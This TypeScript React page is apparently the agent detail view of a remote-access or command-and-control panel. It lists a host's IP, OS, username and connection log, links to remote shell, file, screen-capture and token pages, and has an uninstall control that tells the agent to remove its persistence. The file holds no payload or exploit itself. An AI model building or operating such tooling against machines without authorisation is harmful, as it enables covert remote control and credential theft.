"use client";

import { useEffect, useState, useCallback } from "react";
import { useParams } from "next/navigation";
import Link from "next/link";
import { API_BASE } from "@/lib/constants";
import { apiPostJson } from "@/lib/api";
import { ConfirmModal } from "@/components/UI";
import { useWS } from "@/lib/wsContext";

interface AgentDetail {
  ID?: string; id?: string;
  Hostname?: string; hostname?: string;
  IP?: string; ip?: string;
  OS?: string; os?: string;
  Arch?: string; arch?: string;
  Version?: string; version?: string;
  Status?: string; status?: string;
  LastSeen?: string; last_seen?: string;
  CreatedAt?: string; created_at?: string;
  Note?: string; note?: string;
  Username?: string; username?: string;
  Uptime?: string; uptime?: string;
}

interface LogEntry {
  id?: string; ID?: string;
  user?: string;
  created_at?: string; CreatedAt?: string;
  message?: string;
  type?: string;
}

export default function AgentDetailPage() {
  const params = useParams();
  const id = params?.id as string;
  const [agent, setAgent] = useState<AgentDetail | null>(null);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);

  const loadDetail = useCallback(async () => {
    if (!id) return;
    try {
      const res = await fetch(`${API_BASE}?p=${encodeURIComponent(`/agents/${id}`)}&format=json`);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = await res.json();
      setAgent(data.Agent || data.agent || data);
      const entries: LogEntry[] = data.Logs || data.logs || [];
      setLogs(entries);
    } catch {
      setAgent(null);
      setLogs([]);
    } finally {
      setLoading(false);
    }
  }, [id]);

  useEffect(() => { Promise.resolve().then(() => loadDetail()); }, [loadDetail]);

  const { subscribe } = useWS();
  useEffect(() => {
    if (!id) return;
    const unsub = subscribe((msg) => {
      if (msg.type === "agent_online" || msg.type === "agent_offline") {
        if (String(msg.agent_id) === id) loadDetail();
      } else if (msg.type === "agent_data_update" && String(msg.agent_id) === id) {
        setAgent((prev) => ({ ...prev, ...((msg.data || {}) as Partial<AgentDetail>) }));
      }
    });
    return () => unsub();
  }, [subscribe, id, loadDetail]);

  const [confirmUninstall, setConfirmUninstall] = useState(false);
  const [actionMsg, setActionMsg] = useState<string | null>(null);

  const uninstallAgent = async () => {
    try {
      await apiPostJson(`/agents/${id}/uninstall`, {});
      setActionMsg("Uninstall command sent. Agent will remove persistence and exit.");
    } catch {
      setActionMsg("Uninstall failed");
    }
    setConfirmUninstall(false);
  };

  const agentData = agent || {};
  const hostname = agentData.Hostname || agentData.hostname || "—";
  const ip = agentData.IP || agentData.ip || "—";
  const os = agentData.OS || agentData.os || "—";
  const arch = agentData.Arch || agentData.arch || "—";
  const status = agentData.Status || agentData.status || "offline";
  const lastSeen = agentData.LastSeen || agentData.last_seen || "";

  if (loading) {
    return (
      <div className="flex items-center justify-center py-20">
        <div className="animate-spin w-8 h-8 border-2 border-indigo-500 border-t-transparent rounded-full"></div>
      </div>
    );
  }

  if (!agent) {
    return (
      <div className="max-w-7xl mx-auto mb-20 md:mb-0">
        <div className="text-center py-20">
          <i className="fa-solid fa-bug text-6xl text-slate-300 dark:text-slate-600 mb-4"></i>
          <h2 className="text-xl font-semibold text-[var(--text-primary)] mb-2">Agent Not Found</h2>
          <p className="text-sm text-[var(--text-secondary)] mb-6">The requested agent does not exist or has been removed.</p>
          <Link href="/agents" className="px-4 py-2 bg-indigo-600 text-white rounded-xl text-sm font-medium hover:bg-indigo-700 transition-colors">
            Back to Agents
          </Link>
        </div>
      </div>
    );
  }

  const statusColor = status === "online" ? "bg-emerald-500" : status === "stale" ? "bg-amber-500" : "bg-red-500";

  return (
    <div className="max-w-7xl mx-auto mb-20 md:mb-0">
      <div className="flex items-center gap-3 mb-6">
        <Link href="/agents" className="text-sm text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors">
          <i className="fa-solid fa-arrow-left mr-1"></i> Agents
        </Link>
      </div>

      <div className="ui-card p-6 mb-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <div className="w-14 h-14 rounded-2xl bg-indigo-100 dark:bg-indigo-900/30 flex items-center justify-center">
              <i className="fa-solid fa-bug text-2xl text-indigo-600 dark:text-indigo-400"></i>
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-2xl font-bold text-[var(--text-primary)]">{hostname}</h1>
                <span className={`w-2.5 h-2.5 rounded-full ${statusColor}`}></span>
                <span className="text-xs font-medium text-[var(--text-secondary)]">{status.toUpperCase()}</span>
              </div>
              <p className="text-sm text-[var(--text-secondary)] mt-1">{ip} &middot; {os} {arch}</p>
            </div>
          </div>
          <div className="flex items-center gap-2 flex-wrap">
            <Link href={`/agents/${id}/shell`} className="px-4 h-9 bg-[var(--card-bg)] border border-[var(--border)] rounded-xl text-xs font-medium text-[var(--text-primary)] hover:bg-slate-100 dark:hover:bg-slate-700 transition-colors flex items-center gap-1.5">
              <i className="fa-solid fa-terminal"></i> Shell
            </Link>
            <Link href={`/agents/${id}/files`} className="px-4 h-9 bg-[var(--card-bg)] border border-[var(--border)] rounded-xl text-xs font-medium text-[var(--text-primary)] hover:bg-slate-100 dark:hover:bg-slate-700 transition-colors flex items-center gap-1.5">
              <i className="fa-solid fa-folder-open"></i> Files
            </Link>
            <Link href={`/agents/${id}/screen`} className="px-4 h-9 bg-[var(--card-bg)] border border-[var(--border)] rounded-xl text-xs font-medium text-[var(--text-primary)] hover:bg-slate-100 dark:hover:bg-slate-700 transition-colors flex items-center gap-1.5">
              <i className="fa-solid fa-desktop"></i> Screen
            </Link>
            <Link href={`/tasks?agent_id=${id}`} className="px-4 h-9 bg-[var(--card-bg)] border border-[var(--border)] rounded-xl text-xs font-medium text-[var(--text-primary)] hover:bg-slate-100 dark:hover:bg-slate-700 transition-colors flex items-center gap-1.5">
              <i className="fa-solid fa-list-check"></i> Tasks
            </Link>
            <Link href={`/agents/${id}/token`} className="px-4 h-9 bg-[var(--card-bg)] border border-[var(--border)] rounded-xl text-xs font-medium text-[var(--text-primary)] hover:bg-slate-100 dark:hover:bg-slate-700 transition-colors flex items-center gap-1.5">
              <i className="fa-solid fa-key"></i> Tokens
            </Link>
            <button onClick={() => setConfirmUninstall(true)} className="px-4 h-9 bg-red-600 hover:bg-red-700 text-white rounded-xl text-xs font-medium transition-colors flex items-center gap-1.5">
              <i className="fa-solid fa-trash-can"></i> Uninstall
            </button>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
        <div className="ui-card p-4">
          <div className="text-xs text-[var(--text-secondary)] mb-1">Agent ID</div>
          <div className="text-sm font-mono font-medium text-[var(--text-primary)] break-all">{agentData.ID || agentData.id || "—"}</div>
        </div>
        <div className="ui-card p-4">
          <div className="text-xs text-[var(--text-secondary)] mb-1">Username</div>
          <div className="text-sm font-medium text-[var(--text-primary)]">{agentData.Username || agentData.username || "—"}</div>
        </div>
        <div className="ui-card p-4">
          <div className="text-xs text-[var(--text-secondary)] mb-1">Version</div>
          <div className="text-sm font-medium text-[var(--text-primary)]">{agentData.Version || agentData.version || "—"}</div>
        </div>
        <div className="ui-card p-4">
          <div className="text-xs text-[var(--text-secondary)] mb-1">Last Seen</div>
          <div className="text-sm font-medium text-[var(--text-primary)]">
            {lastSeen ? new Date(lastSeen).toLocaleString() : "—"}
          </div>
        </div>
      </div>

      <div className="ui-card mb-6">
        <div className="px-4 py-3 border-b border-[var(--border)]">
          <h3 className="text-sm font-semibold text-[var(--text-primary)]">Connection Log</h3>
        </div>
        <div className="divide-y divide-[var(--border)]">
          {logs.length === 0 ? (
            <div className="px-4 py-8 text-center text-sm text-[var(--text-secondary)]">
              <i className="fa-solid fa-clock-rotate-left text-2xl mb-2 text-slate-300 dark:text-slate-600"></i>
              <p>No connection history available</p>
            </div>
          ) : (
            logs.map((log, i) => (
              <div key={log.id || log.ID || i} className="px-4 py-3 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <i className="fa-solid fa-circle text-[6px] text-emerald-500"></i>
                  <span className="text-sm text-[var(--text-primary)]">{log.user || "system"}</span>
                </div>
                <div className="text-xs text-[var(--text-secondary)]">
                  {(log.created_at || log.CreatedAt) ? new Date(String(log.created_at || log.CreatedAt)).toLocaleString() : ""}
                </div>
              </div>
            ))
          )}
        </div>
      </div>

      {actionMsg && (
        <div className="ui-card p-4 mb-6 flex items-center justify-between">
          <span className="text-sm text-[var(--text-primary)]">{actionMsg}</span>
          <button onClick={() => setActionMsg(null)} className="text-[var(--text-tertiary)] hover:text-[var(--text-primary)]">
            <i className="fa-solid fa-xmark"></i>
          </button>
        </div>
      )}

      <ConfirmModal
        open={confirmUninstall}
        title="Uninstall Agent"
        message="Send uninstall command? Agent will remove persistence artifacts and exit."
        confirmText="Uninstall"
        onConfirm={uninstallAgent}
        onCancel={() => setConfirmUninstall(false)}
      />
    </div>
  );
}
